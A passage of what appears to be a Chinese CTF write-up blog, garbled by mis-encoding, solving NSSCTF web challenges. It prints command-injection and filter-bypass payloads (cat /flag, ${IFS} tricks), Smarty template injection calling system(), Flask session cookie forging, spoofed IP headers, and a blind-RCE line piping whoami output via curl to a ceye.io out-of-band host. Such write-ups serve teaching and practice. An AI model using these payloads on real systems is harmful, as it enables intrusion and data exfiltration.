(<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;84&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;85&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;86&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;87&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;88&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;89&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;90&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;91&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;92&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;93&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;94&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;95&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;96&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;97&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;98&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;99&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;100&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;101&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;102&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;103&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;104&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;105&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;106&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;107&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;108&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;33&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;34&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;35&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;36&#x27;</span>), </span><br><span class="line"></span><br><span class="line">aaa = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> sss:</span><br><span class="line">    <span class="comment">#(&#x27;1&#x27;, &#x27;33&#x27;), (&#x27;1&#x27;, &#x27;34&#x27;), (&#x27;1&#x27;, &#x27;35&#x27;), (&#x27;1&#x27;, &#x27;36&#x27;), (&#x27;1&#x27;, &#x27;37&#x27;), </span></span><br><span class="line">    aaa[<span class="built_in">int</span>(t[<span class="number">0</span>])] = <span class="built_in">chr</span>(<span class="built_in">int</span>(t[<span class="number">1</span>]))</span><br><span class="line">    <span class="built_in">print</span>(aaa)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#flag&#123;w1reshARK_ez_1sntit&#125;~~~~&lt;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…ä¸€éƒ¨åˆ°ä½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\tjctf\\timu.pcapng&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">st = f.read().decode(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">lis = re.findall(<span class="string">&quot;,([0-9]*),1\)\)=([0-9]*)&quot;</span>,st)</span><br><span class="line">aa = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="comment">#(&#x27;1&#x27;, &#x27;33&#x27;), (&#x27;1&#x27;, &#x27;34&#x27;), (&#x27;1&#x27;, &#x27;35&#x27;), (&#x27;1&#x27;, &#x27;36&#x27;), (&#x27;1&#x27;, &#x27;37&#x27;), </span></span><br><span class="line">    aa[<span class="built_in">int</span>(t[<span class="number">0</span>])] = <span class="built_in">chr</span>(<span class="built_in">int</span>(t[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#flag&#123;w1reshARK_ez_1sntit&#125;~~~~&lt;</span></span><br></pre></td></tr></table></figure><h4 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>PHP_SELFæ˜¯å– payloadçš„åé¢éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯/åé¢çš„</p><p>ä¸‹åˆ’çº¿å¯ä»¥ç”¨[ä»£æ›¿</p><p><code>index.php/utils.php/%89?show[source=1</code></p><p>%88ä¸ºéascllå­—ç¬¦ï¼Œä¸ºä»€ä¹ˆè¦ç”¨ä¸å¯è§å­—ç¬¦ï¼Ÿå¦‚æœæŠŠ%88æ¢æˆaï¼Œ$_SERVER[â€˜PHP_SELFâ€™]ä¼šè¯»å–åˆ°utils.php/aï¼Œbasenameå‡½æ•°å°±ä¼šåªè¯»å–aå¹¶è¿”å›aï¼Œhighlight_fileå°±ä¼šæ˜¾ç¤ºaè¿™ä¸ªæ–‡ä»¶çš„æºä»£ç ï¼Œè¿™-æ˜æ˜¾æ˜¯é”™è¯¯çš„ã€‚å¦‚æœbasenameå‡½æ•°åœ¨è¯»å–åˆ°éascllçš„å­—ç¬¦æ—¶ï¼Œå°±ä¼šåœæ­¢è¯»å–è·¯å¾„äº†ï¼Œå°±ä¼šè¿”å›utils.phpï¼Œå°±å¯ä»¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚ç„¶è€Œbasenameé‡åˆ°éasciiç ä¼šèˆå¼ƒ</p><p>index.php/utils.php/%89?show[source=1</p><h4 id="é¹¤åŸæ¯-2021-Middle-magic"><a href="#é¹¤åŸæ¯-2021-Middle-magic" class="headerlink" title="[é¹¤åŸæ¯ 2021]Middle magic"></a>[é¹¤åŸæ¯ 2021]Middle magic</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./result.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$aaa</span> = preg_replace(<span class="string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/pass_the_level_1#/&#x27;</span>, <span class="variable">$aaa</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;here is level 2&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;admin&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;root_pwd&#x27;</span>])</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// START FORM PROCESSING    </span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;admin&#x27;</span>]) === sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$level_3</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;level_3&#x27;</span>]);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$level_3</span>-&gt;result == <span class="variable">$result</span>) &#123;</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;success:&quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;you never beat me!&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;out&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// perform validations on the form data</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nonono!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  here is level <span class="number">2</span>here is level <span class="number">3</span>,<span class="keyword">do</span> you kown how to overcome it?success:NSSCTF&#123;<span class="number">1</span>cf861d8-a8f0-<span class="number">4</span>ed0-<span class="number">92e8</span>-<span class="number">2</span>c251e4b34a6&#125;</span><br><span class="line">ç¬¬ä¸€ç”¨æ¢è¡Œç¬¦ç»•è¿‡</span><br><span class="line">http:<span class="comment">//node4.anna.nssctf.cn:28689/?aaa=%0apass_the_level_1%23</span></span><br><span class="line">admin[]=<span class="number">1</span>&amp;root_pwd[]=a&amp;level_3=&#123;<span class="string">&#x27;result&#x27;</span>:<span class="string">&#x27;result&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="MoeCTF-2021-babyRCE"><a href="#MoeCTF-2021-babyRCE" class="headerlink" title="[MoeCTF 2021]babyRCE"></a>[MoeCTF 2021]babyRCE</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$rce = $_GET[&#x27;rce&#x27;];</span><br><span class="line">if (isset($rce)) &#123;</span><br><span class="line">    if (!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;, $rce)) &#123;</span><br><span class="line">        system($rce);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        echo &quot;hhhhhhacker!!!&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>http://node2.anna.nssctf.cn:28603/?rce=grep$&#123;IFS&#125;f$&#123;IFS&#125;fla?.php</code></p><p><code>http://node2.anna.nssctf.cn:28603/?rce=ca\t$&#123;IFS&#125;fla\g.php</code></p><p>ç”¨è¿™ä¸ªç©ºæ ¼<code>$&#123;IFS&#125;</code> å…¶ä»–å¥½åƒä¸è¡Œ</p><h4 id="LitCTF-2023-ä½œä¸šç®¡ç†ç³»ç»Ÿ"><a href="#LitCTF-2023-ä½œä¸šç®¡ç†ç³»ç»Ÿ" class="headerlink" title="[LitCTF 2023]ä½œä¸šç®¡ç†ç³»ç»Ÿ"></a>[LitCTF 2023]ä½œä¸šç®¡ç†ç³»ç»Ÿ</h4><p>çœ‹äº†ä¸€ä¸‹æ˜¯æ¢å§¬å¸ˆå‚…å‡ºçš„é¢˜ï¼Œä»¥ä¸ºå¾ˆéš¾ï¼Œå…¶å®æ²¡é‚£ä¹ˆéš¾ï¼Œå¼€å±€çœ‹åˆ°æºä»£ç æœ‰é»˜è®¤å£ä»¤ï¼Œadmin/admin</p><p>ç™»å½•ä¸Šå»ï¼Œç›´æ¥è¿™é‡Œä¸Šä¼ æ–‡ä»¶å°±è¡Œäº†ï¼Œ</p><p><img src="/images/others/image-20230616170455923.png" alt="image-20230616170455923"></p><p>ä¼šä¸Šä¼ åˆ°./ä¸‹ï¼Œä¹Ÿå°±æ˜¯å½“å‰ç›®å½•ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥è®¿é—®å°±è¡Œäº†ã€‚</p><p><img src="/images/others/image-20230616170646937.png" alt="image-20230616170646937"></p><h4 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h4><p>command=127.0.0.1;cat /flag&amp;ping=Ping</p><p><img src="/images/others/image-20230616171115155.png" alt="image-20230616171115155"></p><h4 id="LitCTF-2023-Vim-yyds"><a href="#LitCTF-2023-Vim-yyds" class="headerlink" title="[LitCTF 2023]Vim yyds"></a>[LitCTF 2023]Vim yyds</h4><p>åœ¨vim ç¼–è¾‘é”™è¯¯çš„æ—¶å€™ï¼Œä¼šäº§ç”Ÿ<code>.index.php.swp</code>æ–‡ä»¶ï¼Œæ‰€ä»¥ç›´æ¥ä¸‹è½½``<a href="http://node2.anna.nssctf.cn:28510/.index.php.swp%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%A5%BD%E5%90%8E%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%E4%BC%9A%E4%B9%B1%E7%A0%81%EF%BC%8C%E9%9A%8F%E4%BE%BF%E6%8B%96%E4%B8%AAlinux%E4%B8%8A%EF%BC%8C%E7%84%B6%E5%90%8E">http://node2.anna.nssctf.cn:28510/.index.php.swpï¼Œä¸‹è½½å¥½åï¼Œç›´æ¥æ‰“å¼€ä¼šä¹±ç ï¼Œéšä¾¿æ‹–ä¸ªlinuxä¸Šï¼Œç„¶å</a> vim -r æ–‡ä»¶ï¼Œå³å¯çœ‹åˆ°æºç </p><p><img src="/images/others/image-20230616171611477.png" alt="image-20230616171611477"></p><p><img src="/images/others/image-20230616171949147.png" alt="image-20230616171949147"></p><h4 id="LitCTF-2023-Flagç‚¹å‡»å°±é€ï¼"><a href="#LitCTF-2023-Flagç‚¹å‡»å°±é€ï¼" class="headerlink" title="[LitCTF 2023]Flagç‚¹å‡»å°±é€ï¼"></a>[LitCTF 2023]Flagç‚¹å‡»å°±é€ï¼</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â””â”€<span class="comment"># python3 flask_session_cookie_manager3.py decode -c &#x27;eyJuYW1lIjoiMTIzMTIzIn0.ZJBfaw.eXjErywCjj_0-tZe0l8-X_jc6hA&#x27; -s &#x27;LitCTF&#x27;</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;123123&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿bohemian)-[/tools/flask-session-cookie-manager]</span><br><span class="line">â””â”€<span class="comment"># python3 flask_session_cookie_manager3.py decode -c &#x27;eyJuYW1lIjoiMTIzMTIzMTIzIn0.ZJBf2g.6hBTi7wSIWzWnWHr8F4P9t4CItw&#x27; -s &#x27;LitCTF&#x27;</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;123123123&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿bohemian)-[/tools/flask-session-cookie-manager]</span><br><span class="line">â””â”€<span class="comment"># python3 flask_session_cookie_manager3.py encode -s &#x27;LitCTF&#x27; -t &quot;&#123;&#x27;name&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">eyJuYW1lIjoiYWRtaW4ifQ.ZJBgMQ.JTcEaSlnwJUiq70P847ooZJe0T4</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/others/image-20230619220547444.png" alt="image-20230619220547444"></p><h4 id="LitCTF-2023-PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼"><a href="#LitCTF-2023-PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼" class="headerlink" title="[LitCTF 2023]PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼"></a>[LitCTF 2023]PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼</h4><p>çŒœçš„</p><p><img src="/images/others/image-20230619222453209.png" alt="image-20230619222453209"></p><h4 id="LitCTF-2023-Http-pro-max-pluså·²è§£å†³"><a href="#LitCTF-2023-Http-pro-max-pluså·²è§£å†³" class="headerlink" title="LitCTF 2023]Http pro max pluså·²è§£å†³"></a>LitCTF 2023]Http pro max pluså·²è§£å†³</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Client-Ip: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Remote-Addr: 127.0.0.1</span><br><span class="line">X-Real-Ip: 127.0.0.1</span><br><span class="line">REMOTE-HOST: 127.0.0.1</span><br><span class="line">via:127.0.0.1</span><br><span class="line">Client-Ip: 127.0.0.1 </span><br><span class="line"></span><br><span class="line">Â varÂ list_of_fake_ip_headersÂ =Â [&quot;X-Forwarded-For&quot;,&quot;X-Forwarded&quot;,&quot;Forwarded-For&quot;,&quot;Forwarded&quot;,&quot;X-Forwarded-Host&quot;,&quot;X-remote-IP&quot;,&quot;X-remote-addr&quot;,&quot;True-Client-IP&quot;,&quot;X-Client-IP&quot;,&quot;Client-IP&quot;,&quot;X-Real-IP&quot;,&quot;Ali-CDN-Real-IP&quot;,&quot;Cdn-Src-Ip&quot;,&quot;Cdn-Real-Ip&quot;,&quot;CF-Connecting-IP&quot;,&quot;X-Cluster-Client-IP&quot;,&quot;WL-Proxy-Client-IP&quot;,&quot;Proxy-Client-IP&quot;,&quot;Fastly-Client-Ip&quot;,&quot;True-Client-Ip&quot;];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/others/image-20230619223522170.png" alt="image-20230619223522170"></p><p>NSSCTF{50e3aa21-3d2f-4b28-9670-ac2590b70250}</p><h4 id="GDOUCTF-2023-EZ-WEB"><a href="#GDOUCTF-2023-EZ-WEB" class="headerlink" title="[GDOUCTF 2023]EZ WEB"></a>[GDOUCTF 2023]EZ WEB</h4><p>æ”¹æˆputå°±å¯ä»¥äº†</p><h4 id="HDCTF-2023-SearchMaster"><a href="#HDCTF-2023-SearchMaster" class="headerlink" title="[HDCTF 2023]SearchMaster"></a>[HDCTF 2023]SearchMaster</h4><pre><code>&lt;title&gt;BadBadBooooy&lt;/title&gt;</code></pre><p>php smart</p><p><code>data=&#123;if system(&#39;cat /flag_13_searchmaster&#39;)&#125;&#123;/if&#125;</code></p><p><img src="/images/others/image-20230619225227860.png" alt="image-20230619225227860"></p><h4 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-finalrce"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-finalrce" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]finalrce"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]finalrce</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ— å›æ˜¾rce ,execæ— å›æ˜¾ </p><p>dnså¤–å¸¦ï¼Œä½†æ˜¯å¥½åƒ ä»Šå¤©<a href="http://ceye.io/%E4%B8%8D%E8%83%BD%E7%94%A8%E4%BA%86%EF%BC%8C">http://ceye.io/ä¸èƒ½ç”¨äº†ï¼Œ</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=1;curl `whoami`.*****s.ceye.io/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?url=l&#x27;&#x27;s / | tee 1.txt</span><br><span class="line">è®¿é—®http://node2.anna.nssctf.cn:28030/1.txt</span><br><span class="line">?url=ca&#x27;&#x27;t /flllll\aaaaaaggggggg | tee 2.txt</span><br><span class="line">?url=ca&#x27;&#x27;t /flllll&#x27;&#x27;aaaaaaggggggg | tee 2.txt</span><br><span class="line">è®¿é—®http://node2.anna.nssctf.cn:28030/2.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="ç¾ŠåŸæ¯-2020-easycon"><a href="#ç¾ŠåŸæ¯-2020-easycon" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]easycon"></a>[ç¾ŠåŸæ¯ 